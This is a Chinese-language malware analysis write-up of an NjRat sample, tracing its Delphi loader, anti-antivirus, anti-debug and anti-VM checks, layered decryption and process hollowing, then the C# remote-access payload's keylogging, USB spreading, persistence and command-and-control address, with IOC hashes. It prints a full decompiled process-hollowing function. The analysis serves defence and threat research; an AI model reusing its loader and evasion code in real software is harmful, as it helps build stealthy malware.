0x00 说在前面
=========

在每天的日常工作中，找点样本分析一下是最好的学习方式，这一次又看到一个NjRat 样本，简单分析了一下，发现有点意思，让后被cue 要写详细一点，嘎嘎嘎，不多说，开摆。

0x01 样本分析
=========

![a.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-08848cfc8f65d02bf6598200d328ec5da7c34841.png)

拿到样本后，先来看一下样本的基本信息

![1648528837401.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-718d38a95a7a7cfdaffa8269143154e5a20853c5.png)

这个样本是Delphi 编写的，并且通过沙箱检测来看，内部存在很多混淆，而且仅仅通过IDA 静态分析难以看出一些有价值的信息

![1648529164771.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-42e0bb6f56b2bcedd7a992f0d14a4f5c9d14a3b0.png)

不过还是可以看出在程序中存在大量的被加密过的数据，猜测这里的数据大概率是样本较为核心的功能模块。

这里我调试这个样本的方式是首先确定样本入口点start，并进入到System::\_16705() 函数内部，找到一段循环调用动态函数指针的代码片段，配合x32dbg trace

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e1a82a3f7d2aff2d61c54279971e7c0d79afbcfa.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-78ce9b3f840e0a6595c3dbf9b4d77f0f38b93a73.png)

开启追踪后可以看到最终在执行到eax 值为0x0048BA44出出现暂停，使用IDA 切换到该出函数地址。

在调试之前，可以使用IDR静态分析样本文件并生成map 文件，在使用OD 加载map 文件进行动态调试，map 文件会在调试中的一些符号信息进行补充，方便调试分析。

在这个样本中，是通过产生异常进入异常处理函数后计算出恶意代码地址并跳转。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4769dd2ac6de1e964e15ebf660e9b6fb58b557b1.png)

进入到恶意代码地址后，可以看到传入一个0 地址到解密函数。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-3118c67e1d9dfbdd0d12c55b67ff63ba8c12736a.png)

接着在函数内部判断地址是否为0，并在为0 是调用自身传入正确的内存地址0x486786 进行解密。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-aa4ab50c90e19006e87d7c5cdb33843c745cfafd.png)

在完成对代码的解密后，得到如下的内容

dump 出这里的数据并配合IDA 静态分析。

首先是shellcode 会获取程序所需的函数地址并构建地址表供后续使用

![b.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-a206325a71aa8f2cbe56865fc8acdede539f06c0.png)

接着创建当前系统进程快照遍历进程列表

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9394facde62f9d96550cc0ebd0f97cb8c7e08573.png)

配合上面获取的系统进程列表，检测是否存在杀软进程存在。

- 检测卡巴斯基
    
    ![d.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-7a6fecc6396e6833eedf991a447322157faf18c3.png)
- 检测AVG
    
    ![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9e196fd2808ae3575f02bac17c4b5a3ac65fbec4.png)
- 检测BitDefender
    
    ![e.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-b0a977d5b007a02991852018771549fba6b6a67b.png)
- 检测DwEngine
    
    ![f.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-7b065db5b648d53a0c3ec7119e11774bc4698601.png)

此外，还会检测一些分析软件是否存在以判断当前是否处于被调试状态。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-609841b08101b1080b4d0f86454633dca1f20f89.png)

调用ZwQueryInformationProcess 函数获取当前进程信息判断是否处于被调试状态。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5c69e2d6cd234beceb2865331990e9ebc0d75086.png)

通过检测PEB BeginDebug 位检测是否处于被调试状态。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-82aceb355afccf0d736082accc303fe26bd69206.png)

除了检测调试之外，还会利用虚拟机特征检测样本是否在虚拟环境内执行。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-68a31568497557a775673d1d982bb56b2b157dd1.png)

在通过上诉的检测后，程序会加载所携带的资源到内存中并等待解密。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-26da64011f8981759294344cbb4084f16300fb7e.png)

在资源加载到内存后，会对程序进程两次解密，并得到最终的PE 数据。

第一次解密：

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-9b500c1ccb69775ed6983eecc1f18e0fd8d9f1cd.png)

第二次解密：

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-779b8347a9bdb1a392bb4b21881ceee3120a585e.png)

在完成解密后，得到PE 格式数据。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-c0a10e40cd3deb1a6faf752c7850bfae163fd6aa.png)

接着，程序获取当前进程的命令行并创建自身子进程，在创建进程时将进程挂起，让后通过节表映射的方式将被挂起的子进程PE 数据替换为上述被解密后的PE 数据，并通过设置线程上下文实现对进程的替换。这里的反编译代码如下所示。

```php
int __usercall RunPeInMemAtSubProcessFunc@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int DOS_HEADER, int a5)
{
  int ImageBaseAddress; // eax
  char *v7; // eax
  _DWORD *PointerToRatData; // ecx
  int NT_HEADER1; // eax
  int NT_HEADER; // esi
  _DWORD *targetAddr; // eax
  int sizeOfImage; // [esp-28Ch] [ebp-290h]
  _DWORD *lpContext; // [esp-28Ch] [ebp-290h]
  int cmdLine; // [esp-288h] [ebp-28Ch] BYREF
  _DWORD *targetAddr1; // [esp-284h] [ebp-288h]
  _BYTE v17[72]; // [esp-80h] [ebp-84h] BYREF
  int v18; // [esp-38h] [ebp-3Ch] BYREF
  int ImageBase; // [esp-34h] [ebp-38h]
  int SizeOfHeaders; // [esp-30h] [ebp-34h] BYREF
  _DWORD *targetAddr2; // [esp-2Ch] [ebp-30h]
  int v22; // [esp-28h] [ebp-2Ch] BYREF
  int v23; // [esp-24h] [ebp-28h] BYREF
  int hThread; // [esp-20h] [ebp-24h]
  int v25; // [esp-1Ch] [ebp-20h]
  int v26; // [esp-14h] [ebp-18h] BYREF
  int v27; // [esp-10h] [ebp-14h] BYREF
  int v28; // [esp-Ch] [ebp-10h] BYREF
  int sizeOfImage_1; // [esp-8h] [ebp-Ch]
  int sectionment; // [esp-4h] [ebp-8h]

  if ( *(_WORD *)DOS_HEADER != 0x5A4D )         // MZ
    return 0;
  NT_HEADER = DOS_HEADER + *(_DWORD *)(DOS_HEADER + 0x3C);
  if ( *(_DWORD *)NT_HEADER != 0x4550 )         // PE
    return 0;
  sectionment = *(unsigned __int16 *)(NT_HEADER + 0x14) + NT_HEADER + 0x18;
  memsetFunc(v17, 0, 68);
  memsetFunc(&v23, 0, 16);
  memsetFunc(&cmdLine, 0, 520);
  v7 = (char *)(*(int (**)(void))(a2 + 0xA8))();// GetCommandLineW
  if ( !v7 )
    return 0;
  strcpyFUnc((char *)&cmdLine, v7);
  if ( !(*(int (__stdcall **)(_DWORD, int *, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, _BYTE *, int *))(a2 + 0x50))(// CreateProcessW
          0,
          &cmdLine,
          0,
          0,
          0,
          4,                                    // CREATE_SEPARATE_WOW_VDM
          0,
          0,
          v17,
          &v23) )
    return 0;
  targetAddr = (_DWORD *)(*(int (__stdcall **)(_DWORD, int, int, int, int, int, int, _DWORD *))(a2
                                                                                              + 0x80))(// VirtualAlloc
                           0,
                           4096,
                           12288,
                           4,
                           a3,
                           a1,
                           cmdLine,
                           targetAddr1);
  targetAddr1 = targetAddr;
  *targetAddr = 0x10007;
  targetAddr2 = targetAddr;
  if ( !(*(int (__cdecl **)(int, _DWORD *))(a2 + 0x54))(hThread, targetAddr1) )// GetThreadContext
    goto LABEL_13;
  ImageBaseAddress = GetImageBaseAddressFunc();
  ImageBase = ImageBaseAddress;
  if ( ImageBaseAddress == *(_DWORD *)(NT_HEADER + 0x34) )
    (*(void (__stdcall **)(int, int))(a2 + 0x5C))(v23, ImageBaseAddress);// ZwUnmapViewOfSection
  sizeOfImage = *(_DWORD *)(NT_HEADER + 0x50);
  v26 = 0;
  if ( !j_NtCreateSectionFunc(a2, (int)&v26, sizeOfImage) )// 创建Section NtCreateSection
    goto LABEL_13;
  sizeOfImage_1 = *(_DWORD *)(NT_HEADER + 0x50);
  v28 = 0;
  if ( !NtMapViewOfSectionFunc(a2, v26, -1, (int)&v28, sizeOfImage_1) )// 映射Section NtMapViewOfSection
    goto LABEL_13;
  SizeOfHeaders = *(_DWORD *)(NT_HEADER + 52);
  if ( !NtMapViewOfSectionFunc(a2, v26, v23, (int)&SizeOfHeaders, sizeOfImage_1) )
    goto LABEL_13;
  memcpyFunc((_BYTE *)DOS_HEADER, v28, *(_DWORD *)(NT_HEADER + 84));
  sizeOfImage_1 = 0;
  if ( *(_WORD *)(NT_HEADER + 6) )              // PE
  {
    PointerToRatData = (_DWORD *)(sectionment + 0x14);
    for ( sectionment += 0x14; ; PointerToRatData = (_DWORD *)sectionment )
    {
      memcpyFunc((_BYTE *)(DOS_HEADER + *PointerToRatData), v28 + *(PointerToRatData - 2), *(PointerToRatData - 1));
      NT_HEADER1 = *(unsigned __int16 *)(NT_HEADER + 6);
      ++sizeOfImage_1;
      sectionment += 40;
      if ( sizeOfImage_1 >= NT_HEADER1 )
        break;
    }
  }
  v27 = 0;
  if ( !j_NtCreateSectionFunc(a2, (int)&v27, 0x1000)
    || (v22 = 0,
        !NtMapViewOfSectionFunc(a2, v27, v23, (int)&v22, 4096)
     || (v18 = 0, !NtMapViewOfSectionFunc(a2, v27, -1, (int)&v18, 4096))) )
  {
LABEL_13:
    (*(void (**)(void))(a2 + 0xA4))();          // TerminateProcess
    return 0;
  }
  lpContext = targetAddr2;
  targetAddr2[0x2C] = ImageBase + *(_DWORD *)(NT_HEADER + 40);
  (*(void (__stdcall **)(int, _DWORD *))(a2 + 0x84))(hThread, lpContext);// SetThreadContext
  (*(void (__cdecl **)(int, _DWORD))(a2 + 0x98))(hThread, 0);// ZwResumeThread
  if ( a5 )
    sub_487EF6(a2, v25);
  return 1;
}
```

至此，程序的第一个阶段执行完成，此时的子进程所执行的实际上是上述被解密出的PE 数据，所以我们将这段数据dump 出并进行分析。

| 文件名称 | MD5 |
|---|---|
| dump.bin | c006bf6b9e1fc1fc9f7d8206c94ef424 |

有趣的是，这里所使用的执行逻辑包括shellcode 代码与第一阶段的方式相似度极高，同样是通过创建进程快照检测杀毒程序进程是否存在，检测进程是否处于被调试状态，检测虚拟机，并且在将资源加载到内存后以同样的两次解密得到下一阶段所使用的PE 格式数据，在创建并挂起子进程后进行进程替换实现下一阶段的开始。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-4bcf7634d0640c2be64c2ffa68c0daa91da0b1ae.png)

将这一个PE 数据dump 出并命名为dump2.bin

| 文件名称 | MD5 |
|---|---|
| dump2.bin | 21df60db9211654e785ffbb2d742cc11 |

到此，我们得到一个被UPX 加壳的程序

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-8683d10bc6c8833af7db9d5c38d09cc7ef3f0e42.png)

对程序脱壳后，我们的第三阶段的程序。并且这个程序的资源中还存在一个PE 数据，这个程序暂且先按下不表。

![c.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-2ad1504e2da79990b8d044d1d83a28fcc5ca5297.png)

通过对dump2.bin 的分析得出，程序是将资源数据加载到内存后进行拉伸构建正确的内存状态下的PE 结构，然后通过手动加载CRL 执行（资源所携带的PE 为C# 所编写）。所以仅需将资源的PE 数据dump 出并进行分析就可得到程序的功能。

| 文件名称 | MD5 |
|---|---|
| dump3.bin | 7b2da42826ada69f800559e7e4ca7376 |

载入dnSpy进行分析，通过分析，发现该样本是njRat家族远控木马，其主要功能如下：

- 获取受害者计算机信息
- 远程查看受害者计算机操作（包括键盘和桌面）
- 远程执行文件
- 操作计算机注册表，实现持久化
- 加载计算机麦克风和摄像头驱动\*利用U盘等可卸载驱动进行传播

样本通过不断判断按下的键值，将键值传入该方法，通过对比获取到当前按下的键值所对应的键盘字符，用于写入键盘行为日志。

![1.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-e4de8a28064cde4154b5c5efd09965fab72c3f13.png)

通过获取当前活动的窗口标题和键盘操作，生成日志文件，存放到注册表中，方便之后发送到服务器。

![2.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-5fd091cf8e51b6d48c895284e28b562443b726c6.png)

样本文件通过接受服务器命令并解析，实现对应操作，如命令CAP 实现远程受害者计算机屏幕，命令un 实现对样本程序的停止、卸载或重启。

![3.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-3a644565f299b35cb5f2e3b22fc3dbab4696504e.png)

样本程序通过获取当前计算机驱动设备，并且将自身复制到U盘，同时写入autorun.inf，在U盘下次启动时实现传播

![4.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-88b285ad100322cbb61e31965b5faa2307bc2019.png)

样本创建互斥体，保证只有自己在执行，不受干扰

![5.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-6d12bf5263016143b4d27a875822d39e6f49702c.png)

样本获取计算机系统信息以及设备信息，并且发送到指定的主机：115.186.136.237:5555

![6.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-74b683ccb1ac1e38ef2dafdb2a1c1f8e4e460243.png)

样本通过检查当前运行路径，判断是否时第一次启动，并且在第一次启动时，复制自身到计算机Temp路径以及开始菜单路径下，同时将文件路径写入到注册表，实现程序的自动启动

![7.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-648b63b31f12788dafe9777c8cb62eb9f12026cb.png)

![8.png](https://shs3.b.qianxin.com/attack_forum/2022/03/attach-3b533fb620d1c81a101e6dca93ef1433e10621ed.png)

0x02 最后
=======

其实分析完成，发现样本本身的功能与之前见过的njRat 样本的功能上是类似的，但是这个样本中使用到的一些藏匿方式和加载方式比较有趣，虽然也是较老的技术，但是还是在很多样本上都多少涉及到一些，总之算是闲暇摸鱼时光打发时间的利器吧，呜呜呜。

0x03 IOC
========

115.186.136.237:5555

7b2da42826ada69f800559e7e4ca7376

21df60db9211654e785ffbb2d742cc11

c006bf6b9e1fc1fc9f7d8206c94ef424

5c71ed7 5acf259001 baed5817e30f48b